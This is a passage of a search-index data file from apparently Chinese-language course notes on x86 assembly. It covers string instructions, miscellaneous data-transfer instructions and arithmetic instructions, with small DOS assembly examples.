SS\nMOV WORD PTR SADDR+2, AX\n\n# LOAD NEW SP, SS\nMOV AX, DS\nMOV SS, AX\nMOV AX, OFFSET STOP\nMOV SP, AX\nSTI\n\n# DO STH\n# DO STH\n# DO STH\n\n# RESTORE OLD STACK\nLSS SP, SADDR\n</code></pre>"},{"location":"Courses/asm/ch4/#string-data-transfer","title":"STRING DATA TRANSFER","text":"<p>x86 \u6307\u4ee4\u53ea\u6709\u4e24\u4e2a\u64cd\u4f5c\u6570\uff0c\u56e0\u6b64\u4e0d\u5f97\u4e0d\u9690\u5f0f\u4f7f\u7528\u5404\u79cd\u9ed8\u8ba4\u5bc4\u5b58\u5668</p> <p>\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u5305\u62ec\uff1a</p> <ul> <li><code>movs</code> \u5b57\u7b26\u4e32\u590d\u5236 move string </li> <li><code>cmps</code> \u5b57\u7b26\u4e32\u6bd4\u8f83 compare string</li> <li><code>scas</code> \u5b57\u7b26\u4e32\u641c\u7d22 scan string</li> <li><code>stos</code> \u5199\u5165\u5b57\u7b26\u4e32 store string</li> <li><code>lods</code> \u8bfb\u53d6\u5b57\u7b26\u4e32 load string</li> <li><code>ins</code> \u4ece io \u63a5\u53e3\u8bfb\u53d6\u5b57\u7b26\u4e32 in string</li> <li><code>outs</code> \u5411 io \u63a5\u53e3\u5199\u5165\u5b57\u7b26\u4e32 out string</li> </ul> <p>\u4e0e\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u76f8\u5173\u7684\u6307\u4ee4\u524d\u7f00\u5305\u62ec\uff1a</p> <ul> <li><code>rep</code> \u91cd\u590d repeat</li> <li><code>repe</code> \u82e5\u76f8\u7b49\u5219\u91cd\u590d repeat if equal</li> <li><code>repz</code> \u82e5\u7ed3\u679c\u4e3a\u96f6\u5219\u91cd\u590d repeat if zero \uff0c\u4e0e <code>repe</code> \u7b49\u6548</li> <li><code>repne</code> \u82e5\u4e0d\u76f8\u7b49\u5219\u91cd\u590d repeat if not equal</li> <li><code>repnz</code> \u82e5\u4e0d\u4e3a\u96f6\u5219\u91cd\u590d repeat if not zero , \u4e0e <code>repne</code> \u7b49\u6548</li> </ul> <p>\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u53ef\u4ee5\u4e0e\u6307\u4ee4\u524d\u7f00\u7ed3\u5408\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\u3002\u5355\u72ec\u4f7f\u7528\u8868\u793a\u4ec5\u6267\u884c\u4e00\u6b21\u5b57\u7b26\u4e32\u64cd\u4f5c\uff0c\u800c\u52a0\u4e86\u6307\u4ee4\u524d\u7f00\u5219\u53ef\u4ee5\u6700\u591a\u91cd\u590d\u6267\u884c CX \u6b21\u3002</p> <p>\u6307\u4ee4\u540e\u7f00 <code>B</code> \u5219\u8868\u793a\u64cd\u4f5c\u6570\u7684\u5927\u5c0f\u3002</p> <p>REP MOVSB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rep movsb</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u4ece <code>DS:[SI]</code> \u590d\u5236\u5b57\u7b26\u4e32\u5230 <code>ES:[DI]</code><ul> <li>byte ptr ES:[DI] = byte ptr DS:[SI];</li> <li>if(DF == 0) {SI++; DI++} \u5373\u6b63\u5411\u590d\u5236</li> <li>if(DF == 1) {SI--; DI--} \u5373\u53cd\u5411\u590d\u5236</li> <li>CX--; if(CX == 0) goto DONE;</li> </ul> </li> </ul> <p>REPE CMPSB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a repe cmpsb</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u6bd4\u8f83 <code>DS:[SI]</code> \u4e0e <code>ES:[DI]</code> \u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06 SI \u548c DI \u505c\u7559\u5728\u7b2c\u4e00\u6b21\u4e0d\u76f8\u7b49\u7684\u5730\u65b9<ul> <li>cmp byte ptr ES:[DI], byte ptr DS:[SI];</li> <li>if(DF == 0) {SI++; DI++} \u5373\u6b63\u5411\u6bd4\u8f83</li> <li>if(DF == 1) {SI--; DI--} \u5373\u53cd\u5411\u6bd4\u8f83</li> <li>CX--; if(CX == 0 || ZF != 0) goto DONE;</li> </ul> </li> <li>\u6ce8\u610f: <code>CMPS</code> \u6307\u4ee4\u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d\uff0c\u5f53\u9000\u51fa\u8be5\u6307\u4ee4\u65f6\uff0c\u6807\u5fd7\u5bc4\u5b58\u5668 FL \u6062\u590d;\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u7528 <code>je</code> \u7b49\u6307\u4ee4\u5b9e\u73b0\u5224\u65ad\u8df3\u8f6c</li> </ul> <p>\u53ef\u4ee5\u81ea\u5df1\u8bd5\u8bd5\u4e0b\u9762\u7684\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u679c\uff1a</p> <pre><code>comment @\n\u5c06\u5b57\u7b26\u4e32s\u590d\u5236\u5230\u5230t\u4e2d\uff0c\u5e76\u6bd4\u8f83s\u548ct\u662f\u5426\u76f8\u7b49\n@\n\ndata segment\ns db \"I hate Monsterhunter:wild\", 0Dh, 0Ah    ; , '$'\nslen =  $ - offset s\nequal_msg db \"Equal\", 0Dh, 0Ah, '$'\nunequal_msg db \"Not Equal\", 0Dh, 0Ah, '$'\ndata ends\n\nextra segment\nt db slen dup(0)\nextra ends\n\ncode segment\nassume cs:code, ds:data, es:extra\ncompare:\n    mov si, offset s           ; \u4e3a\u4ec0\u4e48\u8fd9\u91cc\u9700\u8981\u91cd\u65b0\u5bf9 si \u548c di \u8d4b\u503c\uff1f\n                               ; \u56e0\u4e3a movsb \u6307\u4ee4\u5df2\u7ecf\u5bf9\u5176\u8fdb\u884c\u4e86++\u64cd\u4f5c\n    mov di, offset t\n    mov cx, slen\n    repe cmpsb                 ; \u6bd4\u8f83\u5b57\u7b26\u4e32\n    je is_equal\nnot_equal:\n    mov dx, offset unequal_msg\n    jmp output\nis_equal:\n    mov dx, offset equal_msg\noutput:\n    mov ah, 9                  ; \u8f93\u51fa ds:[dx] \u7684\u5b57\u7b26\u4e32\uff0c\u76f4\u5230\u9047\u5230 '$'\n    int 21h\n    ret\n\nmain:\n    mov ax, data\n    mov ds, ax\n    mov ax, extra\n    mov es, ax\n    mov si, offset s\n    mov di, offset t\n    mov cx, slen\n    cld                        ; DF = 0\n    rep movsb                  ; \u5b57\u7b26\u4e32\u590d\u5236\n    mov cx, slen\n    mov bx, 0\nL1:\n    mov dl, byte ptr es:[bx]   ; \u53d6\u6570\u636e\uff0c\u4e0d\u80fd\u662f t:[bx]\uff1bbyte ptr \u4e0d\u52a0\u4e5f\u884c\n    mov ah, 2                  ; \u5982\u679c\u5b57\u7b26\u4e32\u4ee5 '$' \u7ed3\u5c3e\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528ah = 9\u8f93\u51fadx\u4e2d\u5b57\u7b26\u4e32\n    int 21h\n    inc bx\n    loopnz L1                  ; CX--,\u82e5cx\u4e0d\u7b49\u4e8e\u96f6\uff0c\u5219\u5faa\u73af\n    call compare\nexit:\n    mov ah, 1h\n    int 21h\n    mov ah, 4ch\n    int 21h\ncode ends\nend main\n</code></pre> <p>$</p> <p>\u8fd9\u91cc\u6570\u636e\u6bb5\u4e2d\u6709\u4e00\u53e5 <code>slen = $ - offset s</code>\uff0c\u4f5c\u7528\u662f\u8ba1\u7b97\u6570\u7ec4 s \u7684\u957f\u5ea6\u3002\u4f46\u662f <code>slen</code> \u672c\u8eab\u4e0d\u4f1a\u51fa\u73b0\u5728\u6570\u636e\u6bb5\u5185\uff0c\u800c\u662f\u7c7b\u4f3c\u4e8e\u5b8f\u7684\u5b58\u5728\u3002</p> <p>REPE SCASB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a repe scasb</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5728 <code>ES:[DI]</code> \u6307\u5411\u7684\u76ee\u6807\u5b57\u7b26\u4e32\u4e2d\u641c\u7d22 AL|AX|EAX \u7684\u503c</li> <li>\u6ce8\u610f: \u57fa\u672c\u539f\u7406\u57fa\u672c\u540c\u4e0a\uff0c\u4e00\u822c\u53ea\u5229\u7528 CX \u524d\u540e\u7684\u53d8\u5316\u6c42\u5b57\u7b26\u4e32\u957f\u5ea6</li> </ul> <p>\u7528 <code>repne scasb</code> \u6c42\u5b57\u7b26\u4e32\u957f\u5ea6\uff1a</p> <pre><code>data segment\ns db \"Sakura no toki\", 0\nslen dw 0\ndata ends\n\ncode segment\nassume cs:code, ds:data\nmain:\n    mov ax, data\n    mov ds, ax\n    mov es, ax\n    mov di, offset s\n    mov cx, 0FFFFh     ; \u6700\u5927\u641c\u7d22\u6b21\u6570\n    xor al, al         ; AL = 0h\n    cld                ; DF = 0\n    repne scasb\n    inc cx             ; 00h \u4e0d\u7b97\u5728\u5b57\u7b26\u4e32\u5185\n    not cx             ; CX = 0FFFFh - CX = \u641c\u7d22\u8fc7\u7684\u5b57\u7b26\u4e2a\u6570\n    mov [slen], cx\n    mov ah, 4Ch\n    int 21h\ncode ends\nend main\n</code></pre> <p>REP STOSB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rep stosb</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u628a AL|AX|EAX \u7684\u503c\u5199\u5165 <code>ES:[DI]</code> \u6307\u5411\u7684\u76ee\u6807\u5b57\u7b26\u4e32</li> <li>\u6ce8\u610f: \u57fa\u672c\u539f\u7406\u57fa\u672c\u540c\u4e0a</li> </ul> <p>REP LODSB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rep lodsb</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4ece <code>ES:[DI]</code> \u4e2d\u8bfb\u53d6 x \u4e2a\u5b57\u8282\u4fdd\u5b58\u5728 AL|AX|EAX \u4e2d</li> <li>\u6ce8\u610f: \u57fa\u672c\u539f\u7406\u57fa\u672c\u540c\u4e0a\uff0cx \u4e3a\u5bf9\u5e94\u7684\u5b57\u8282\u957f\u5ea6</li> </ul> <p>INS / OUTS</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a <ul> <li>INSB / INSW / INSD</li> <li>OUTSB / OUTSW / OUTSD</li> </ul> </li> <li>\u6307\u4ee4\u6548\u679c\uff1a     \u8fd9\u4e24\u6761\u90fd\u662f\u4e32\u64cd\u4f5c\u6307\u4ee4\uff0c\u7528\u4e8e\u5728\u7aef\u53e3\u4e0e\u5185\u5b58\u4e4b\u95f4\u8fdb\u884c\u6570\u636e\u5757\u4f20\u8f93\uff0c\u914d\u5408 <code>REP</code>\u3001<code>REPE</code>\u3001<code>REPNE</code> \u7b49\u524d\u7f00\u53ef\u5b9e\u73b0\u6279\u91cf\u8f93\u5165\u8f93\u51fa\u3002  <ul> <li><code>INS</code>\uff1a\u4ece I/O \u7aef\u53e3\u8bfb\u5165\u6570\u636e \u2192 \u5199\u5165\u5230\u5185\u5b58\u5730\u5740 <code>ES:[DI]</code></li> <li><code>OUTS</code>\uff1a\u4ece\u5185\u5b58\u5730\u5740 <code>DS:[SI]</code> \u8bfb\u6570\u636e \u2192 \u5199\u5165\u5230 I/O \u7aef\u53e3</li> <li>\u82e5\u65b9\u5411\u6807\u5fd7 <code>DF = 0</code>\uff1a<code>SI</code>\u3001<code>DI</code> \u9012\u589e\uff08\u6b63\u5411\u4f20\u8f93\uff09  </li> <li>\u82e5\u65b9\u5411\u6807\u5fd7 <code>DF = 1</code>\uff1a<code>SI</code>\u3001<code>DI</code> \u9012\u51cf\uff08\u53cd\u5411\u4f20\u8f93\uff09  </li> <li>\u6267\u884c\u5b8c\u4e00\u6b21\u540e\uff0c\u82e5\u5e26\u6709 <code>REP</code> \u524d\u7f00\uff0c\u5219\u4f1a\u81ea\u52a8 <code>CX--</code> \u5e76\u5faa\u73af\u76f4\u5230 <code>CX=0</code></li> </ul> </li> <li>\u6ce8\u610f\u4e8b\u9879\uff1a <ul> <li> <ol> <li><code>INS</code> \u9ed8\u8ba4\u76ee\u7684\u6bb5\u4e3a ES\uff0c\u800c\u6e90\u4e3a I/O \u7aef\u53e3\uff0c\u56e0\u6b64\u4e0d\u80fd\u66f4\u6539\u76ee\u7684\u6bb5\u5bc4\u5b58\u5668\u3002  </li> </ol> </li> <li> <ol> <li><code>OUTS</code> \u9ed8\u8ba4\u6e90\u6bb5\u4e3a DS\uff0c\u800c\u76ee\u7684\u4e3a I/O \u7aef\u53e3\uff0c\u540c\u6837\u4e0d\u80fd\u4fee\u6539\u76ee\u6807\u6bb5\u3002  </li> </ol> </li> <li> <ol> <li>\u4e24\u8005\u90fd\u4f7f\u7528 DX \u6307\u5b9a\u7aef\u53e3\u53f7\uff0c\u5fc5\u987b\u4fdd\u8bc1\u7aef\u53e3\u5df2\u88ab\u6b63\u786e\u6620\u5c04\u6216\u5141\u8bb8\u8bbf\u95ee\u3002  </li> </ol> </li> <li> <ol> <li>\u4e00\u822c\u5728\u7cfb\u7edf\u7ea7\u7f16\u7a0b\u3001\u8bbe\u5907\u9a71\u52a8\u6216\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u4f7f\u7528\uff0c\u7528\u6237\u6001\u7a0b\u5e8f\u901a\u5e38\u4e0d\u53ef\u76f4\u63a5\u4f7f\u7528\u3002  </li> </ol> </li> <li> <ol> <li>\u5f53\u4f7f\u7528 <code>REP INS</code> \u6216 <code>REP OUTS</code> \u65f6\uff0cCPU \u4f1a\u81ea\u52a8\u6839\u636e <code>CX</code> \u7684\u503c\u8fdb\u884c\u6279\u91cf I/O \u64cd\u4f5c\u3002</li> </ol> </li> </ul> </li> </ul>"},{"location":"Courses/asm/ch4/#miscellaneous-data-trnasfer","title":"MISCELLANEOUS DATA TRNASFER","text":"<p>\u6700\u540e\u662f\u4e00\u4e9b\u4e0d\u597d\u5206\u7c7b\u7684\u6570\u636e\u4f20\u8f93\u6307\u4ee4\uff0c\u5305\u62ec <code>XCHG</code>, <code>LAHF</code>, <code>SAHF</code>, <code>XLAT</code>, <code>IN</code>, <code>OUT</code>, <code>BSWAP</code>, <code>MOVSX</code>, <code>MOVZX</code>, <code>CMOV</code> \u7b49\u3002</p> <p>XCHG</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a xchg op1, op2</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4ea4\u6362 op1 \u548c op2</li> <li>\u6ce8\u610f\uff1a <code>xchg</code> \u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d\uff1b\u4e14\u4e0d\u80fd\u5bf9\u6bb5\u5bc4\u5b58\u5668\u64cd\u4f5c</li> </ul> <p><code>XHCG</code> \u53ef\u4ee5\u7528\u6765\u5728\u8fdb\u7a0b\u540c\u6b65\u4e4b\u95f4\u5b9e\u73b0\u81ea\u65cb\u9501\uff0c\u4f8b\u5982\uff1a</p> <pre><code># lock variable 1: locked, 0: unlocked\nlocked dd 0\n\nspin_lock:\n    # set EAX = 1\n    mov eax, 1\n\n    lock xchg eax, [locked]\n\n    test eax, eax\n\n    # if eax = 0, we obtain the lock\n    # otherwise, repeatedly request\n    jnz spin_lock\n    ret\n</code></pre> <p>LAHF</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a lahf</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5c06 EFLAGS \u7684\u4f4e\u516b\u4f4d\u653e\u5165 AH</li> <li>\u6ce8\u610f\uff1a AH := (SF:ZF:0:AF:0:PF:1:CF)</li> </ul> <p>SAHF</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a sahf</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4ece AH \u8bfb\u5165 EFLAGS \u7684\u4f4e\u516b\u4f4d</li> </ul> <p>XLAT</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a xlat</li> <li>\u6307\u4ee4\u6548\u679c\uff1a al = byte ptr ds:[bx+al]</li> <li>\u6ce8\u610f\uff1a \u76f8\u5f53\u4e8e bx \u662f\u57fa\u5730\u5740\uff0cal \u662f\u504f\u79fb\u5730\u5740\uff0c\u7528\u6765\u67e5\u8868\u64cd\u4f5c</li> </ul> <p>\u5229\u7528 xlat \u6307\u4ee4\u548c\u8f6c\u6362\u8868\u5c06\u5341\u8fdb\u5236\u6574\u6570\u8f6c\u6362\u6210\u5341\u516d\u8fdb\u5236\u5e76\u8f93\u51fa\uff1a</p> <pre><code>.386\ndata segment use16\nt db \"0123456789ABCDEF\"\nx dd 2147483647\ndata ends\n\ncode segment use16\nassume cs:code, ds:data\nmain:\n  mov ax, data      ;\\\n  mov ds, ax        ; | ds:bx-&gt;t[0]\n  mov bx, offset t  ;/\n  mov cx, 8\n  mov eax, [x]\nnext:\n  rol eax, 4\n  push eax\n  and eax, 0Fh\n  xlat\n  mov ah, 2\n  mov dl, al\n  int 21h\n  pop eax\n  loop next\n  mov ah, 4Ch\n  int 21h\ncode ends\nend main\n</code></pre> <p>MOVSX</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a movsx dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u628a\u503c src \u7b26\u53f7\u6269\u5145\u81f3 dest \u4e2d</li> <li>\u6ce8\u610f\uff1a dest \u7684\u4f4d\u5bbd\u9700\u5927\u4e8e src</li> <li>\u4f8b\u5b50\uff1a<ul> <li><code>movsx bx, al ; al = 80h</code> =&gt; <code>bx = 0FF80h</code></li> </ul> </li> </ul> <p>MOVZX</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a movzx dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u628a\u503c src \u96f6\u6269\u5145\u81f3 dest \u4e2d</li> <li>\u6ce8\u610f\uff1a dest \u7684\u4f4d\u5bbd\u9700\u5927\u4e8e src</li> <li>\u4f8b\u5b50\uff1a<ul> <li><code>movzx bx, al ; al = 80h</code> =&gt; <code>bx = 0080h</code></li> </ul> </li> </ul> <p>BSWAP</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a bswap reg</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u9006\u5411\u6307\u5b9a\u5bc4\u5b58\u5668\u7684 byte order\uff0c\u76f8\u5f53\u4e8e\u5927\u7aef\u5c0f\u7aef\u683c\u5f0f\u8f6c\u6362</li> <li>\u6ce8\u610f\uff1a \u5176 opcode \u683c\u5f0f\u8f83\u7279\u6b8a <code>[REX.W, 0F, C8 + rd]</code></li> </ul> <p>CMOVcc</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a cmovcc dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5982\u679c\u6ee1\u8db3\u6761\u4ef6 <code>cc</code>\uff0c\u5219\u6267\u884c mov</li> <li>\u6ce8\u610f\uff1a cc \u53ef\u4ee5\u662f <code>AE</code>, <code>BE</code>, <code>Z</code>, <code>G</code>, <code>E</code> \u7b49\u7b49\uff0c\u4e0e\u63a7\u5236\u8f6c\u79fb\u6307\u4ee4\u7c7b\u4f3c</li> </ul> \u4f7f\u7528 <code>cmovcc</code> \u4ee3\u66ff\u5206\u652f\uff0c\u589e\u5927\u57fa\u672c\u5757\u548c\u8c03\u5ea6\u8303\u56f4 <p></p>"},{"location":"Courses/asm/ch5/","title":"Arithmetic & Logic Instructions","text":""},{"location":"Courses/asm/ch5/#arithmetic-logic-instructions","title":"Arithmetic &amp; Logic Instructions","text":"<p> \u7ea6 1768 \u4e2a\u5b57  33 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>\u5728\u539f\u5148 8086 \u6c47\u7f16\u8bed\u8a00\u7b14\u8bb0\u7684\u57fa\u7840\u4e0a\u65b0\u589e\u90e8\u5206\u6307\u4ee4</p>"},{"location":"Courses/asm/ch5/#_1","title":"\u7b97\u672f\u6307\u4ee4","text":""},{"location":"Courses/asm/ch5/#_2","title":"\u52a0\u6cd5\u6307\u4ee4","text":"<p>ADD</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a add dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest += src</li> </ul> <p>ADC</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a adc dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest += src + CF</li> <li>\u6ce8\u610f\uff1a \u5373\u5e26\u8fdb\u4f4d\u52a0\u6cd5\uff0cadd with carry</li> </ul> <p>INC</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a inc op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a op++</li> <li>\u6ce8\u610f\uff1a inc \u6307\u4ee4\u4e0d\u5f71\u54cd CF</li> </ul> <p>\u4e60\u9898</p> <p>\u6c42 12345678h+4243BCBCh \u7684\u548c\uff0c\u8981\u6c42\u7ed3\u679c\u5b58\u653e\u5728\u5bc4\u5b58\u5668DX:AX\u4e2d\uff1a</p> <pre><code>mov ax, 5678h\nmov dx, 1234h\nadd ax, 0BCBCh\nadc dx, 4243h\n</code></pre> <p>XADD</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a xadd dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a src = dest; dest += src<ul> <li>\u4f8b\u5982 xadd ah(1000h), bh(2000h)\uff0c\u6267\u884c\u5b8c\u540e ah = 3000h, bh = 1000h</li> </ul> </li> <li>\u6ce8\u610f\uff1a exchange and add</li> </ul>"},{"location":"Courses/asm/ch5/#_3","title":"\u51cf\u6cd5\u6307\u4ee4","text":"<p>SUB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a sub dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest -= src</li> </ul> <p>SBB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a sbb dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest = dest - src - CF</li> <li>\u6ce8\u610f\uff1a \u5373\u5e26\u501f\u4f4d\u51cf\u6cd5\uff0csubtract with borrow</li> </ul> <p>DEC</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a dec op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a op--</li> <li>\u6ce8\u610f\uff1a dec \u6307\u4ee4\u4e0d\u5f71\u54cd CF</li> </ul> <p>NEG</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a neg op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a op = -op</li> <li>\u6ce8\u610f\uff1a \u76f8\u5f53\u4e8e\u53d6\u53cd\u52a0\u4e00(\u6c42\u8865\u7801, op = not op + 1)\uff0c\u975e\u96f6\u6570\u6c42\u8865\u540e\u00a0CF = 1\uff0c0 \u6c42\u8865\u540e\u00a0CF = 0</li> </ul> <p>CMP</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a cmp op1, op2</li> <li>\u6307\u4ee4\u6548\u679c\uff1a compare op1 - op2</li> <li>\u6ce8\u610f\uff1a cmp \u6307\u4ee4\u5e76\u4e0d\u8ba1\u7b97\u5dee\u503c\uff0c\u4f46\u4f1a\u50cf sub op1, op2 \u5f71\u54cd\u72b6\u6001\u6807\u5fd7\uff0c\u540e\u9762\u901a\u5e38\u63a5\u8df3\u8f6c\u6307\u4ee4</li> </ul> <p>CMPXCHG</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a cmpxhg dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a<ul> <li>\u5982\u679c dest == accu\uff0c\u90a3\u4e48 dest = src\uff0cZF = 1</li> <li>\u5982\u679c dest &lt;&gt; accu\uff0c\u90a3\u4e48 accu = dest\uff0cZF = 0</li> </ul> </li> <li>\u6ce8\u610f\uff1a cmpxhg \u6307\u4ee4\u9690\u5f0f\u4f7f\u7528\u4e86 A \u7cfb\u5217\u5bc4\u5b58\u5668\u4f5c\u4e3a\u64cd\u4f5c\u6570\uff0c\u5e76\u4e14\u4f1a\u5f71\u54cd\u72b6\u6001\u6807\u5fd7 ZF</li> </ul> <p>\u8bd5\u5199\u51fa\u5bf9\u5b58\u653e\u5728DX:AX\u4e2d\u768432\u4f4d\u6570\u8fdb\u884c\u6c42\u8865(neg)\u7684\u6c47\u7f16\u6307\u4ee4\u5e8f\u5217</p> <pre><code>neg ax    ; \u82e5 ax \u975e\u96f6\uff0c\u5219\u4ea7\u751f\u8fdb\u4f4d CF=1\npushf     ; \u4fdd\u5b58 CF \u72b6\u6001\nneg dx\npopf      ; \u6062\u590d CF \u72b6\u6001\nsbb dx, 0 ; \u51cf\u53bb neg ax \u4ea7\u751f\u7684\u8fdb\u4f4d\n</code></pre>"},{"location":"Courses/asm/ch5/#_4","title":"\u4e58\u6cd5\u6307\u4ee4","text":"<p>MUL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a mul src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u975e\u7b26\u53f7\u6570\u4e58\u6cd5<ul> <li>src \u4e3a 8 \u4f4d\u65f6\uff0cax = al * src</li> <li>src \u4e3a 16 \u4f4d\u65f6\uff0cdx:ax = ax * src</li> <li>src \u4e3a 32 \u4f4d\u65f6\uff0cedx:eax = eax * src</li> </ul> </li> <li>Example: DX:AX=<code>123400h</code> \u27a1 DX=<code>0012h</code>, AX=<code>3400h</code> </li> </ul> <p>IMUL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a imul src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u7b26\u53f7\u6570\u4e58\u6cd5<ul> <li>src \u4e3a 8 \u4f4d\u65f6\uff0cax = al * src</li> <li>src \u4e3a 16 \u4f4d\u65f6\uff0cdx:ax = ax * src</li> <li>src \u4e3a 32 \u4f4d\u65f6\uff0cedx:eax = eax * src</li> </ul> </li> </ul> <p>IMUL \u7684\u7b2c\u4e8c\u7c7b\u7528\u6cd5</p> <p>Intel \u7b2c\u4e8c\u4ee3CPU\u4e3a<code>IMUL</code>\u65b0\u589e\u4e86\u7528\u6cd5\uff0c\u652f\u6301\u4e24\u4e2a\u6216\u4e09\u4e2a\u64cd\u4f5c\u6570\u3002\u4ee5\u4e0b\u56db\u7ec4\u6307\u4ee4\u90fd\u5b9e\u73b0\u5bf9<code>eax</code>\u4e5810\uff0c\u4e0d\u540c\u7684\u662f\uff0c<code>lea</code>\u548c<code>imul</code>\u6307\u4ee4\u5e76\u4e0d\u80fd\u5904\u7406\u4e58\u6cd5\u7684\u6ea2\u51fa\uff1a</p> <pre><code>mov ebx, 10\nmul ebx               ; edx:eax = eax * ebx\n\nmov ebx, 10\nimul eax, ebx         ; eax = eax * ebx\n\nimul eax, eax, 10     ; eax = eax * Imm\n\nadd eax, eax\nlea eax, [eax+eax*4]  ; eax = eax*2 + eax*8\n</code></pre>"},{"location":"Courses/asm/ch5/#_5","title":"\u9664\u6cd5\u6307\u4ee4","text":"<p>DIV</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a div src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u975e\u7b26\u53f7\u6570\u9664\u6cd5<ul> <li>src \u4e3a 8 \u4f4d\u65f6\uff0cal = ax / src, ah = ax % src</li> <li>src \u4e3a 16 \u4f4d\u65f6\uff0cax = dx:ax / src, dx = dx:ax % src</li> <li>src \u4e3a 32 \u4f4d\u65f6\uff0ceax = edx:eax / src, edx = edx:eax % src</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u82e5\u9664\u6570\u4e3a 0 \u6216\u8005\u4fdd\u5b58\u5546\u7684\u5bc4\u5b58\u5668\u65e0\u6cd5\u5bb9\u7eb3\u5546\u65f6\u4f1a\u53d1\u751f\u9664\u6cd5\u6ea2\u51fa\uff0c\u6b64\u65f6 CPU \u4f1a\u5728\u9664\u6cd5\u6307\u4ee4\u4e0a\u65b9\u63d2\u5165\u5e76\u6267\u884c\u4e00\u6761 int 00h \u6307\u4ee4(\u9664\u6cd5\u7684\u5f02\u5e38\u5904\u7406)</li> </ul> <p>IDIV</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a idiv src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u7b26\u53f7\u6570\u9664\u6cd5<ul> <li>src \u4e3a 8 \u4f4d\u65f6\uff0cal = ax / src, ah = ax % src</li> <li>src \u4e3a 16 \u4f4d\u65f6\uff0cax = dx:ax / src, dx = dx:ax % src</li> <li>src \u4e3a 32 \u4f4d\u65f6\uff0ceax = edx:eax / src, edx = edx:eax % src</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u82e5\u9664\u6570\u4e3a 0 \u6216\u8005\u4fdd\u5b58\u5546\u7684\u5bc4\u5b58\u5668\u65e0\u6cd5\u5bb9\u7eb3\u5546\u65f6\u4f1a\u53d1\u751f\u9664\u6cd5\u6ea2\u51fa\uff0c\u6b64\u65f6 CPU \u4f1a\u5728\u9664\u6cd5\u6307\u4ee4\u4e0a\u65b9\u63d2\u5165\u5e76\u6267\u884c\u4e00\u6761 int 00h \u6307\u4ee4</li> </ul>"},{"location":"Courses/asm/ch5/#_6","title":"\u903b\u8f91\u8fd0\u7b97\u548c\u79fb\u4f4d\u6307\u4ee4","text":""},{"location":"Courses/asm/ch5/#_7","title":"\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4","text":"<p>AND</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a and dest, src</li> 